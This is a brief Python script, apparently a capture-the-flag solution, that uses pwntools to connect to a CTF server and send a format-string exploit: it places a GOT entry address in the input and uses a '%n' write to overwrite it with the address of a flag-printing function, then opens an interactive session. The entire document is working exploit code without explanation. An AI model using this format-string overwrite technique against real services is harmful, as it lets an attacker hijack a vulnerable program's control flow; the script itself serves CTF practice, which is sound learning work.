from pwn import *

r = remote('ctf.j0n9hyun.xyz',3002)
flag = 0x080485B4
decflag = '%'+str(int(flag)-4)+'x'+'%n'
print_got = 0x804A00c
p = p32(print_got)
p+=decflag
r.sendline(p)
r.interactive()
